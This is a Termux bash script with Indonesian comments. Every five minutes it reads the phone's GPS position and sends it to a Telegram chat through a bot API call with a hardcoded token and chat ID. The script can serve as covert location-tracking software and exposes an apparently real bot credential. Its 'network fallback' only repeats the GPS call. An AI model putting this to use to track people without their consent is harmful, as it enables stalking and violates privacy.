#!/data/data/com.termux/files/usr/bin/bash

# Token dan chat_id Telegram
TOKEN="7450852198:AAEJrO8y3gqaWFECOW87VtOpOtx13_WwrXg"
CHAT_ID="8107240151"

while true; do
    # Ambil lokasi dari GPS
    LOC=$(termux-location 2>/dev/null)

    # Fallback ke network jika GPS gagal
    if [ -z "$LOC" ]; then
        LOC=$(termux-location 2>/dev/null)
    fi

    # Cek hasil lokasi
    if [ -n "$LOC" ]; then
        LAT=$(echo "$LOC" | jq -r '.latitude')
        LON=$(echo "$LOC" | jq -r '.longitude')
        ACC=$(echo "$LOC" | jq -r '.accuracy')
        LINK="https://www.google.com/maps?q=${LAT},${LON}"

        # Kirim ke Telegram dengan format Markdown agar link bisa diklik
        curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
            -d chat_id="$CHAT_ID" \
            -d parse_mode="Markdown" \
            -d text="📍 *Lokasi Terkini:*\n[Klik untuk buka di Google Maps]($LINK)\n\n🛰️ *Akurasi:*  ±${ACC}m\n🕒 *Waktu:* $(date)"

    else
        echo "❌ Gagal mengambil lokasi"
    fi

    # Tunggu 5 menit
    sleep 300
done
